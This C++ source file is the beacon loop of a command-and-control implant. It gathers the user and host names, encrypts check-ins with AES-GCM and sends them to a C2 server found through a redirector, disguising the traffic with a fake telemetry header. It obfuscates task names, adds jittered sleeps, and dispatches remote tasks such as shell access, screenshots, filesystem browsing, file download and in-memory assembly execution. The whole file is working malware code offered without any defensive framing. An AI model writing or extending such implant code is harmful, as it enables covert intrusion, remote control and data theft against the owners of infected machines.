#include "Beacon.h"
#include "../core/Config.h"
#include "../core/ImplantId.h"
#include "../crypto/AesGcm.h"
#include "../http/RedirectorResolver.h"
#ifdef _WIN32
#include "../http/WinHttpClient.h"
#else
#include "../http/HttpClient.h"
#endif
#include "../persistence/Persistence.h"
#include "Task.h"
#include "../external/nlohmann/json.hpp"
#include <chrono>
#include <random>
#include <thread>
#include <vector>
#include <algorithm>
#include "../utils/Logger.h"
#include "../utils/Obfuscator.h"
#include <regex>
#ifndef _WIN32
#include <unistd.h>
#include <sys/utsname.h>
#include <fstream>
#include <sched.h>
#else
#include <windows.h>
#include <winhttp.h>
#endif
namespace {
    beacon::TaskType stringToTaskType(const std::string& str) {
        if (str == OBF("sysinfo")) return beacon::TaskType::SYSINFO;
        if (str == OBF("installed_software")) return beacon::TaskType::INSTALLED_APPS;
        if (str == OBF("ishell") || str == OBF("shell")) return beacon::TaskType::ISHELL;
        if (str == OBF("screenshot")) return beacon::TaskType::SCREENSHOT;
        if (str == OBF("browse_fs")) return beacon::TaskType::BROWSE_FS;
        if (str == OBF("file_download")) return beacon::TaskType::FILE_DOWNLOAD;
        if (str == OBF("execute_assembly")) return beacon::TaskType::EXECUTE_ASSEMBLY;
        return beacon::TaskType::UNKNOWN;
    }
    std::string getUsername() {
#ifdef _WIN32
        DWORD len = 0; GetUserNameW(NULL, &len);
        if (len > 0) { std::vector<wchar_t> u(len); GetUserNameW(u.data(), &len); std::string r; for(auto c:u) if(c) r+=(char)c; return r; }
#else
        char* user = getenv("USER"); if (user) return std::string(user);
#endif
        return "Unknown";
    }
    std::string getHostname() {
#ifdef _WIN32
        DWORD len = 0; GetComputerNameW(NULL, &len);
        if (len > 0) { std::vector<wchar_t> h(len); GetComputerNameW(h.data(), &len); std::string r; for(auto c:h) if(c) r+=(char)c; return r; }
#else
        char host[256]; if (gethostname(host, sizeof(host)) == 0) return std::string(host);
#endif
        return "Unknown";
    }
}
namespace beacon {
Beacon::Beacon() : c2FetchBackoff_(core::C2_FETCH_BACKOFF), taskDispatcher_(pendingResults_) {
    implantId_ = core::generateImplantId();
    LOG_INFO("Implant ID: " + implantId_);
}
void Beacon::sleepWithJitter() {
    uint32_t h = 0; std::string host = getHostname();
    for (char c : host) h = h * 31 + (uint32_t)c;
    std::mt19937 gen(h ^ (unsigned int)std::chrono::system_clock::now().time_since_epoch().count());
    std::normal_distribution<> d(core::SLEEP_BASE, core::SLEEP_BASE * (core::JITTER_PCT / 100.0));
    double sleep_duration = std::max(3.0, d(gen));
#ifdef LINUX
    auto start = std::chrono::steady_clock::now();
    uint32_t delay_ms = (uint32_t)(sleep_duration * 1000);
    while (true) {
        auto elapsed = (uint32_t)std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::steady_clock::now() - start).count();
        if (elapsed >= delay_ms) break;
        for (int i = 0; i < 100000; ++i) {
            volatile int j = i; (void)j;
        }
        sched_yield();
    }
#else
    std::this_thread::sleep_for(std::chrono::milliseconds((int)(sleep_duration * 1000)));
#endif
}
void Beacon::run() {
    http::RedirectorResolver resolver(core::REDIRECTOR_URL);
    std::vector<BYTE> key_vec(core::BEACON_KEY, core::BEACON_KEY + 32);
    crypto::AesGcm aes(key_vec);
    while (true) {
        if (c2Url_.empty()) {
            try {
                LOG_INFO("Resolving C2 URL...");
                c2Url_ = resolver.resolve();
                LOG_INFO("C2 URL: " + c2Url_);
                c2FetchBackoff_ = core::C2_FETCH_BACKOFF;
            }
            catch (const std::exception& e) {
                LOG_ERR("C2 resolution failed: " + std::string(e.what()));
                std::this_thread::sleep_for(std::chrono::duration<double>(c2FetchBackoff_));
                if (c2FetchBackoff_ < 35 * 60) c2FetchBackoff_ *= 2;
                continue;
            }
        }
        try {
            nlohmann::json payload = {{"id", implantId_}, {"os",
#ifdef _WIN32
"windows"
#else
"linux"
#endif
}, {"arch", "amd64"}, {"user", getUsername()}, {"host", getHostname()}, {"results", nlohmann::json::array()}};
            int capped = 0; Result res;
            while (capped < 10 && pendingResults_.try_dequeue(res)) { inFlightResults_.push_back(res); capped++; }
            for (const auto& r : inFlightResults_) payload["results"].push_back({{"task_id", r.task_id}, {"output", r.output}, {"error", r.error}});

            std::string payload_str = payload.dump();
            std::vector<BYTE> plaintext(payload_str.begin(), payload_str.end());
            std::vector<BYTE> nonce(12);
#ifdef _WIN32
            HCRYPTPROV hProv; if (CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) { CryptGenRandom(hProv, 12, nonce.data()); CryptReleaseContext(hProv, 0); }
#else
            std::ifstream ur("/dev/urandom", std::ios::binary); if (ur.is_open()) ur.read((char*)nonce.data(), 12);
#endif
            std::vector<BYTE> ciphertext = aes.encrypt(plaintext, nonce);
            std::vector<BYTE> enc_p; enc_p.insert(enc_p.end(), nonce.begin(), nonce.end()); enc_p.insert(enc_p.end(), ciphertext.begin(), ciphertext.end());

            std::string server, path; std::regex re(R"(https?://([^/]+)(/.*))"); std::smatch m;
            if (std::regex_search(c2Url_, m, re)) { server = m[1].str(); path = m[2].str(); } else {
                LOG_ERR("Failed to parse C2 URL: " + c2Url_);
                c2Url_ = ""; continue;
            }

            LOG_INFO("Sending beacon to " + server + path);
            std::vector<BYTE> resp;
#ifdef _WIN32
            http::WinHttpClient client(std::wstring(core::USER_AGENTS[0].begin(), core::USER_AGENTS[0].end()));
            std::wstring h = L"X-Telemetry-Key: " + std::wstring(core::API_KEY.begin(), core::API_KEY.end()) + L"\r\n";
            resp = client.post(std::wstring(server.begin(), server.end()), std::wstring(path.begin(), path.end()), enc_p, h);
#else
            http::HttpClient client(core::USER_AGENTS[0]); std::string h_headers = "X-Telemetry-Key: " + core::API_KEY + "\r\n";
            resp = client.post(server, path, enc_p, h_headers);
#endif
            if (resp.size() >= 12) {
                LOG_INFO("Received response from C2, size: " + std::to_string(resp.size()));
                std::vector<BYTE> r_nonce(resp.begin(), resp.begin() + 12); std::vector<BYTE> r_ctx(resp.begin() + 12, resp.end());
                std::vector<BYTE> dec_resp = aes.decrypt(r_ctx, r_nonce);
                nlohmann::json r_json = nlohmann::json::parse(std::string(dec_resp.begin(), dec_resp.end()));
                if (r_json.contains("ack_ids")) {
                    std::vector<std::string> acks = r_json["ack_ids"];
                    inFlightResults_.erase(std::remove_if(inFlightResults_.begin(), inFlightResults_.end(), [&](const Result& r){ return std::find(acks.begin(), acks.end(), r.task_id) != acks.end(); }), inFlightResults_.end());
                }
                if (r_json.contains("tasks")) {
                    for (const auto& t_j : r_json["tasks"]) {
                        Task t; t.task_id = t_j["task_id"]; t.type = stringToTaskType(t_j["type"]); t.cmd = t_j.value("cmd", "");
                        LOG_INFO("Dispatching task: " + t.task_id);
                        std::thread(&TaskDispatcher::dispatch, &taskDispatcher_, t).detach();
                    }
                }
            } else {
                LOG_ERR("Empty or invalid response from C2");
            }
        } catch (const std::exception& e) {
            LOG_ERR("Beacon execution error: " + std::string(e.what()));
            if (inFlightResults_.size() > 5) inFlightResults_.clear();
        }
        sleepWithJitter();
    }
}
}
